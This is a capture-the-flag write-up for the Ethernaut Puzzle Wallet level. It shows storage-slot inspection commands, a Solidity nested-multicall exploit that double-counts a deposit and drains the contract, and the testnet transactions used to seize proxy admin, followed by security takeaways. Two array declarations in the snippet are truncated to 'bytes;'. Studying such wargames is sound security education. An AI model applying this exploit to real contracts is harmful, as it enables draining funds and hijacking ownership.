# Ethernaut Challenge 24 — Puzzle Wallet

## 🎯 Goal

Become the **admin of the proxy contract** by exploiting:

* **storage collisions**
* **delegatecall behavior**
* a **flawed multicall implementation**

---

## 🧠 Key Concepts

* Upgradeable proxy (EIP-1967)
* Storage slot collisions
* `delegatecall` context (same storage, same `msg.sender`, same `msg.value`)
* Nested `multicall` vulnerability

---

## 🔍 Initial Analysis

Instance:

```bash
PUZZLE_PROXY_SEPOLIA=0x8573cA54260a177c618A3B028fD02E0D904307cB
```

### Check admin

```bash
cast call $PUZZLE_PROXY_SEPOLIA \
  "admin()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

```
0x725595BA16E76ED1F6cC1e1b65A88365cC494824
```

### Check pendingAdmin

```bash
cast call $PUZZLE_PROXY_SEPOLIA \
  "pendingAdmin()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

```
0x725595BA16E76ED1F6cC1e1b65A88365cC494824
```

---

## 🧪 Local Test

Before interacting with Sepolia, I reproduced the exploit locally:

👉 [PuzzleProxyTest.t.sol](../../test/challenge-24-puzzle-wallet/PuzzleProxyTest.t.sol)

This test simulates:

* proxy deployment
* storage collision behavior
* multicall vulnerability
* full admin takeover

---

### 🔍 Core Exploit (from the test)

The key insight is the **nested multicall**:

```solidity
bytes memory depositCalldata = abi.encodeCall(PuzzleWallet.deposit, ());

bytes;
innerMultiCalldata[0] = depositCalldata;

bytes;
outerMulticallData[0] = depositCalldata;
outerMulticallData[1] = abi.encodeCall(PuzzleWallet.multicall, (innerMultiCalldata));
outerMulticallData[2] = abi.encodeCall(
    PuzzleWallet.execute,
    (player, 0.002 ether, bytes(""))
);

wallet.multicall{value: 0.001 ether}(outerMulticallData);
```

### 🧠 Why this works

* `deposit()` is executed **twice**
* but only **0.001 ETH is sent once**
* due to `delegatecall`, both calls reuse the same `msg.value`

Result:

* internal balance = **0.002 ETH**
* real contract balance = **0.002 ETH**

Then:

```solidity
execute(player, 0.002 ether, "")
```

👉 drains the contract to zero

---

### 🔗 From Local Test → Sepolia

The local test allowed me to:

* understand the exploit safely
* validate the call sequence
* translate the logic into **raw calldata using `cast`**

---

## ⚠️ Step 2 — Storage Collision

### Slot 0

| Proxy        | Wallet |
| ------------ | ------ |
| pendingAdmin | owner  |

```bash
cast call $PUZZLE_PROXY_SEPOLIA "owner()(address)"
```

```
0x725595BA16E76ED1F6cC1e1b65A88365cC494824
```

👉 `owner == pendingAdmin`

---

### Slot 1

| Proxy | Wallet     |
| ----- | ---------- |
| admin | maxBalance |

```bash
cast call $PUZZLE_PROXY_SEPOLIA \
  "maxBalance()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

```
652733554269361572482625626281549340425241315364
```

Convert:

```bash
cast --to-hex 652733554269361572482625626281549340425241315364
```

```
0x725595ba16e76ed1f6cc1e1b65a88365cc494824
```

👉 same as admin

---

### 🧠 Insight

A storage slot is 32 bytes:

* interpreted as `address` → last 20 bytes
* interpreted as `uint256` → full value

👉 This allows us to **overwrite `admin` via `maxBalance`**

---

## 🚀 Exploit on Sepolia

We executed the exploit using our automated Foundry script `script/24-PuzzleWallet.s.sol` which automates all steps (proposing admin, whitelisting, nested multicall deposit, draining, and setting max balance to hijack slot 1).

Execute it using:
```bash
forge script script/24-PuzzleWallet.s.sol --rpc-url sepolia --broadcast
```

### 📜 My Transactions

* **Propose New Admin (Slot 0 Takeover)**: [0x3ae5e2a080abe69b2a8aed3fbb9fa2af118a03c43927de0c53455583c9ad60b8](https://sepolia.etherscan.io/tx/0x3ae5e2a080abe69b2a8aed3fbb9fa2af118a03c43927de0c53455583c9ad60b8)
* **Add to Whitelist**: [0xa6350293ab0c3c3028a94a05d3753be55ed835a87d856af5ba92d782721db5ca](https://sepolia.etherscan.io/tx/0xa6350293ab0c3c3028a94a05d3753be55ed835a87d856af5ba92d782721db5ca)
* **Nested Multicall Deposit (Double-counting ETH)**: [0xb60eda965206886a212720d7d3f9f1884fd811c48da92b05094cfca1213b1e71](https://sepolia.etherscan.io/tx/0xb60eda965206886a212720d7d3f9f1884fd811c48da92b05094cfca1213b1e71)
* **Execute Withdraw (Draining Contract)**: [0xbbd0f901b401bcf4cb5fc486303ecb0157f9368b8f2ed614cd656f5cd731bab0](https://sepolia.etherscan.io/tx/0xbbd0f901b401bcf4cb5fc486303ecb0157f9368b8f2ed614cd656f5cd731bab0)
* **Set Max Balance (Slot 1 / Admin Takeover)**: [0x1be2ad646882aa371ffe33b3ff7c19080adc72c8d55e76dcad03bbf13cc7a192](https://sepolia.etherscan.io/tx/0x1be2ad646882aa371ffe33b3ff7c19080adc72c8d55e76dcad03bbf13cc7a192)
* **Exploit Block**: 10933151

---

## 🛡️ Security Takeaways
* **Validate storage slot layouts**: Under delegated proxy patterns, always ensure the implementation contract shares the exact same variable layouts and slots as the proxy to avoid storage collisions.
* **Track state variables globally inside batch executions**: When allowing batched delegatecalls like `multicall()`, ensure that contextual attributes like `msg.value` are not reused recursively by implementing strict execution guards.
* **Keep administrative functions secure**: Ensure state-updating configuration actions check contract status and caller authorizations cleanly.

